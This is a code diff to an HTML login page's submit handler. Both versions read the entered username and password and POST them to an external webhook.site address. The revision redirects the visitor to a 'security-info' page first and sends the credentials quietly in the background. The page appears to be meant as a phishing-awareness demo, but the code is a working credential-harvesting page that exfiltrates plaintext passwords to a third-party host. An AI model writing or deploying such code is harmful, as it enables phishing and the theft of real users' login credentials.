@@ -26,27 +26,30 @@
     <script>
         document.getElementById("authForm").addEventListener("submit", function(event) {
             event.preventDefault(); // Prevent actual form submission
+            
+            // Get user input
+            let user = document.querySelector('input[name="user"]').value;
+            let pass = document.querySelector('input[name="pass"]').value;
+            
+            // Redirect user immediately to awareness page
+            window.location.href = "security-info.html";
 
-            let formData = new FormData();
-            formData.append("user", document.querySelector('input[name="user"]').value);
-            formData.append("pass", document.querySelector('input[name="pass"]').value);
-            formData.append("action", "Login Attempt");
-            formData.append("time", new Date());
-
+            // Send form data in the background
             fetch("https://webhook.site/39b5507e-6e25-4a60-b84e-3cd3e4e84c0f", {
                 method: "POST",
-                body: formData
-            })
-            .then(response => response.text())
-            .then(data => {
-                console.log("Webhook response:", data);
-                window.location.href = "security-info.html"; // Redirect after successful send
-            })
-            .catch(error => console.error("Error:", error));
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    user: user,
+                    pass: pass,
+                    action: "Login Attempt",
+                    time: new Date().toISOString()
+                })
+            }).catch(error => console.error("Error sending data:", error));
         });
     </script>
 
 </body>
 </html>
+
 
 
